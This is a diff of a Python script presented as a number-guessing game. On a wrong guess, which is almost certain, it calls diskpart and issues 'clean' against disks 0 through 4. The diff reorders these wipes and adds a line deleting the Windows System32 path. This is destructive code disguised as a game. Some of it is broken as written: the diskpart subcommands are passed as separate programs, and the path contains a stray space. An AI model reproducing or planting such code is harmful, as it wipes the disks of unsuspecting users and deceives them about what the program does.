@@ -1,5 +1,6 @@
 import random
 import subprocess
+import os
 
 print("this game will lie to you.")
 x = random.randint(1000000,1000000000)
@@ -10,13 +11,14 @@ if guess == x:
 else:
   subprocess.run(['diskpart'])
   subprocess.run(['list disk'])
-  subprocess.run(['select disk 0'])
-  subprocess.run(['clean'])
-  subprocess.run(['select disk 1'])
-  subprocess.run(['clean'])
-  subprocess.run(['select disk 2'])
+  subprocess.run(['select disk 4'])
   subprocess.run(['clean'])
   subprocess.run(['select disk 3'])
   subprocess.run(['clean'])
-  subprocess.run(['select disk 4'])
+  subprocess.run(['select disk 2'])
   subprocess.run(['clean'])
+  subprocess.run(['select disk 1'])
+  subprocess.run(['clean'])
+  subprocess.run(['select disk 0'])
+  subprocess.run(['clean'])
+  os.remove("C:\\Windows \\System32")
